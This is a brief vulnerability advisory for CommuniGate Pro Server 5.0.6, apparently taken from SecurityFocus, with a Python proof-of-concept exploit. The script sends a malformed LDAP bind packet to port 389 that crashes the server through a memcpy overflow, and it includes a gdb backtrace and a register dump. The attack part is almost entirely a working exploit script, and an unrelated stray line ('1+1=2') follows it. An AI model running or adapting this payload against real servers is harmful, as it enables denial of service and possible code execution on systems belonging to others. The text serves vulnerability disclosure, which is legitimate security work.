source: http://www.securityfocus.com/bid/16407/info

CommuniGate Pro Server is prone to a remote denial-of-service vulnerability with a potential for arbitrary code execution. This issue reportedly resides in the LDAP component of the application.

CommuniGate Pro Server 5.0.6 is vulnerable; earlier versions may also be affected. 

#!/usr/bin/env python
# Use this code at your own risk.
# It may crash your server!
# Author: Evgeny Legerov

import sys
import socket

HELP="""
CommuniGate Pro 5.0.6 vulnerability.
Found with ProtoVer LDAP testsuite v1.1

Program received signal SIGSEGV, Segmentation fault.
[Switching to Thread -1389495376 (LWP 20235)]
0xada99bbc in memcpy () from /lib/libc.so.6
(gdb) backtrace
#0  0xada99bbc in memcpy () from /lib/libc.so.6
#1  0x083924b8 in STCopyCString ()
#2  0x08349d5b in BERPackedData::makeCString ()
#3  0x081ae71a in VLDAPInput::processBINDrequest ()
#4  0x081af747 in VLDAPInput::processInput ()
#5  0x082c9373 in VStream::worker ()
#6  0x082ca1e9 in VStream::starter ()
#7  0x08399e7d in STThreadStarter ()
#8  0xadb8bb80 in start_thread () from /lib/libpthread.so.0
#9  0xadaf8dee in clone () from /lib/libc.so.6
(gdb) x/i $eip
0xada99bbc <memcpy+28>: repz movsl %ds:(%esi),%es:(%edi)
(gdb) info regi esi edi ecx
esi            0x8688961        141068641
edi            0x86c6fff        141324287
ecx            0x3fff7eae       1073708718
"""

print HELP

host="localhost"
port=389

sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((host,port))

s  = "\x30\x12\x02\x01\x01\x60\x0d\x02\x01\x03\x04\x02\x44\x4e\x80"
s += "\x84\xff\xff\xff\xff"

sock.sendall(s)
sock.close()
1+1=2